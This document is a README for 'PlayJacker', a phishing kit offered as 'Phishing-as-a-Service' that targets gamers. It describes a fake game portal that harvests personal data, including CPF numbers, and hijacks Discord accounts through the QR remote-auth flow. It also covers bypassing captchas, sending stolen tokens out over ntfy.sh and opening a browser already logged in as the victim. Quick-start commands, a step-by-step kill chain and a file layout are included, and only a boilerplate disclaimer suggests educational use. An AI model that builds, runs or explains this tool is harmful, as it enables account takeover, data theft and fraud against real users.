# 🎮 PlayJacker

**Phishing-as-a-Service for gamers.** A fake game portal that harvests PII (name, birth date, CPF, e-mail, WhatsApp) and hijacks Discord accounts through the official **QR Login (remote-auth)** flow — then drops you straight into the victim's session in your own browser.

> One command. Public link. Captured token → auto-logged browser.

```
 ██████╗ ██╗      █████╗ ██╗   ██╗     ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
 ██╔══██╗██║     ██╔══██╗╚██╗ ██╔╝     ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
 ██████╔╝██║     ███████║ ╚████╔╝      ██║███████║██║     █████╔╝ █████╗  ██████╔╝
 ██╔═══╝ ██║     ██╔══██║  ╚██╔╝  ██   ██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
 ██║     ███████╗██║  ██║   ██║   ╚█████╔╝██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
 ╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
```

---

## ⚡ What it does

| Stage | Detail |
|---|---|
| 🕸️ **Portal** | Fake game portal ("JogaVerse") served on the internet via Cloudflare tunnel — instant public HTTPS link |
| 📋 **PII harvest** | Optional form: full name, birth date, CPF, e-mail, WhatsApp → `victims.json` |
| 🔐 **Discord hijack** | "Continue with Discord" starts the official **remote-auth v2** flow (RSA-2048 OAEP) — victim authorizes in the Discord app, we capture the **user token** |
| 🤖 **Anti-bot bypass** | Handles Discord's `captcha-required`: pauses the session, serves an hCaptcha page for the attacker to solve, retries the exchange with `captcha_key` + `captcha_rqtoken` |
| 📡 **Delivery** | Token published over the internet via **ntfy.sh** → the listener opens a Chromium window **already logged into the victim's account** (iframe localStorage injection) |

## 🏗️ Architecture

```
 victim (any device)             attacker PC                    Discord
 ──────────────────            ─────────────                  ───────
  opens public link  ──HTTPS──▶ cloudflared tunnel
                                 │
                                 ▼
                          server.py (portal + remote-auth client)
                                 │  ▲
                       wss://remote-auth-gateway.discord.gg/?v=2
                                 │  │  (RSA-2048 OAEP handshake)
                                 ▼  │
                          Discord gateway ◀── ticket exchange ── api/v9
                                 │
                        token captured ──POST──▶ ntfy.sh topic
                                                    │ SSE (+catch-up)
                                                    ▼
                                           listener.py
                                                    │
                                           Chromium opens LOGGED IN 🎉
```

## 🚀 Quick start

```bash
# 1. deps
pip install -r requirements.txt
python -m playwright install chromium

# 2. (optional) pick your own ntfy topic in config.py

# 3. GO
python playjacker.py
```

The orchestrator prints the public link (and a shortened one as a bonus):

```
========================================================
  LINK PRONTO (funciona em qualquer rede):
    https://xxxx-xxxx-xxxx.trycloudflare.com
========================================================
```

## 🎯 The kill chain

1. Victim opens the link → game portal → **"🎮 Continuar com Discord"**
2. Portal runs the remote-auth handshake and serves the QR **and** a direct auth link (Android `intent://` → Chrome → Discord app)
3. Victim approves in the Discord app → portal receives the ticket
4. **If Discord demands captcha** (flagged IP): console prints
   `[captcha] resolva em <url>/captcha/<sid>` — open it, solve the hCaptcha, done
5. Token captured → `tokens.txt` + linked to the victim record in `victims.json`
6. Token rides ntfy.sh to the listener → **browser window opens logged in**

## 📁 Files

| File | Role |
|---|---|
| `playjacker.py` | Orchestrator: portal + tunnel + short link + listener, all in one |
| `server.py` | Portal + remote-auth engine (RSA-OAEP, ticket exchange, captcha flow) |
| `listener.py` | ntfy subscriber → auto-login in Chromium (iframe trick, retries) |
| `open_now.py` | Open a browser session with the latest token in `tokens.txt` |
| `config.py` | Shared config: `PORT`, `TOPIC`, `UA` |
| `victims.json` / `tokens.txt` | Harvested data (git-ignored) |

## 🔧 Notes

- The quick tunnel link changes on every run — restart `playjacker.py` for a fresh one
- Discord flags IPs after many remote-auth logins: expect `captcha-required`; the built-in captcha page handles it
- Free URL shorteners are hijacked by some mobile carriers — the raw tunnel link always works

## ⚠️ Disclaimer

Educational security research only. Use exclusively against accounts, devices and networks you own or are explicitly authorized to test. The author assumes no responsibility for misuse.
